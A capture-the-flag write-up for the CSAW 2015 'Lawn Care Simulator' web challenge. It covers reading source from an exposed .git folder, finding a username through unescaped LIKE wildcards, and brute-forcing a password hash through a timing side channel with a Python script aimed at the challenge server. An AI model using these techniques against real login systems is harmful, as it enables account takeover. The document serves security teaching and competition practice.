# Lawn Care Simulator (Web, 200pts)

## Problem

Lawn Care Simulator is a simple web application to show how the grass is growing. Yeah, ok. It has premium content, but it requires registration. Registration not working and there's no way to log in as we can't register any account.

## Solution

### Phase 1 - explore .git repository

In source code of index.html there's an AJAX request to Git repository (to find current application version). So we can exploit .git folder on remote server.

Following SHA-1 Git objects hash, we can find and download source files (not all, unfortunately):

Here's tree hash:
```
$ git cat-file -p aa3025bdb15120ad0a2558246402119ce11f4e2e
tree 731924d14616f3f95c1d75e822a6a97a69f1a32f
author John G <john@lawncaresimulator2015thegame.com> 1442602067 +0000
committer John G <john@lawncaresimulator2015thegame.com> 1442602067 +0000

I think I'll just put mah source code riiiiighhhht here. Perfectly safe place for some source code.
```

And here's tree content:

```
$ git cat-file -p 731924d14616f3f95c1d75e822a6a97a69f1a32f

100644 blob 4bcb0b3cf55c14b033e3d7e0a94b6025f6956ec7	___HINT___

100644 blob 637c8e963a5fb7080ff639b5297bb10bca491bda	validate_pass.php
```

File HINT does not contain anything helpful. But as we can analyze source code of some files and after a few minutes of reading it, we can identify some key points:


* registration is NOT working, BUT we can try guess/find already existing username(s):

```php
    $user = mysql_real_escape_string($_POST['username']);
    // check to see if the username is available
    $query = "SELECT username FROM users WHERE username LIKE '$user';";
    $result = mysql_query($query) or die('Query failed: ' . mysql_error());
    $line = mysql_fetch_row($result, MYSQL_ASSOC);
    if ($line == NULL){
        // Signing up for premium is still in development
        echo '<h2 style="margin: 60px;">Lawn Care Simulator 2015 is currently in a private beta. Please check back later</h2>';
    }
    else {
        echo '<h2 style="margin: 60px;">Username: ' . $line['username'] . " is not available</h2>";
    }
```

* login is working, but we have to find valid username and try to pass login validation. After succesful login we will be able to get the flag:

```php
    require_once 'validate_pass.php';
    require_once 'flag.php';
    if (isset($_POST['password']) && isset($_POST['username'])) {
        $auth = validate($_POST['username'], $_POST['password']); 
        if ($auth){
            echo "<h1>" . $flag . "</h1>";
        }
        else {
            echo "<h1>Not Authorized</h1>";
        }
    }
    else {
        echo "<h1>You must supply a username and password</h1>";
    }
```


### Phase 2 - find username

Let's get throug these lines (sign_up.php):

```php
    $user = mysql_real_escape_string($_POST['username']);
    // check to see if the username is available
    $query = "SELECT username FROM users WHERE username LIKE '$user';";
  
```

First of all - mysql_real_escape_string() does not allow SQL Injection here. But as we can see, we can try to use special chars for LIKE (% or _), which are NOT ESCAPED by mysql_real_escape_string().

So when we try to register with username eg. '%%', we see this screen:

We have existing username, now we have to try to find the password.

![Got username](https://github.com/bl4de/ctf/blob/master/2015/CSAW_CTF_2015/Lawn_Care_Simulator_web200/lawncare02.png)


### Phase 3 - bruteforce password validation

Validation of password looks a little bit tricky at the first look:

```php

    if (strlen($pass) != strlen($hash))
        return False;
		
    $index = 0;
    while($hash[$index]){
        if ($pass[$index] != $hash[$index])
            return false;
        # Protect against brute force attacks
        usleep(300000);
        $index+=1;
    }
    return true;
```

*$hash* is value from DB and *$pass* is MD5 hash of password from login form. First check is the length - if the length of $pass not equals the length of $hash, validation returns false. So even if we spoof login form we still have to send 32 signs (MD5 hash).

Then script checks sign by sign if $hash and $pass are equal and it returns false right after first difference. If signs are the same, it waits 0.3 sec before next check. And this is exactly what we need to bruteforce this validation.

Assuming that any valid sign took about 0.3 sec break before next sign, we can compare requests time for every single character allowed in MD5 string starting from first character (any hex digit in this case). I've created simple Python script for this. It just creates 32 characters string starting from 0 through f and sending it to the server. Then we can check if there's character which causes a little bit longer response:

```python
#!/usr/bin/python

import requests
import sys

headers = {
    "Referer": "http://54.175.3.248:8089/",
    "Content-type": "application/x-www-form-urlencoded",
    "Host": "54.175.3.248:8089"
}


def send_request(current_password):
    payload = {"username": "~~FLAG~~", "password": current_password}

    r = requests.post("http://54.175.3.248:8089/premium.php", headers=headers,
                      data=payload)
    return r.elapsed.total_seconds()


charset = "abcdef0123456789"
final_password = sys.argv[1]

current_password = ""
s = ""
for c in charset:
    current_password = final_password + c + "-" * (31 - len(final_password))

    # send payload and check response time, avg from 3 probes
    print "sending payload with password: {}".format(current_password)

    t = send_request(current_password)
    print "time for {} - {}".format(c, t)

final_password += s
print "\n\ncurrent final password: {} ({} chars)\n\n".format(final_password,
                                                             len(
                                                                 final_password))

```

It took some time, but finally I was able to find 10 first characters in MD5 hash of FLAG user password - and when I've sent it I've got the flag. Below are console outputs from sample try after three signs (667) - script shows 4th sign, which is 'e' - timing is ~0.3s more than average, then one of the final try with 667e217666 as the beginning, when times were not changing anymore:

```

After *667e217666* time of responses stopped to change, so I've decided to try only with this (I've added some random chars to get 32 characters length of the whole hash) - and it was enough:

![Grab the flag](https://github.com/bl4de/ctf/blob/master/2015/CSAW_CTF_2015/Lawn_Care_Simulator_web200/lawncare03.png)


And the flag was: *gr0wth__h4ck!nG!1!1!*

(I don't know why it has worked just after 10 characters, but I suppose that there was some kind of pre-validation, which was not visible in the code and CTF organizers were able to determine valid solution a little bit earlier than after all guessed hash.)
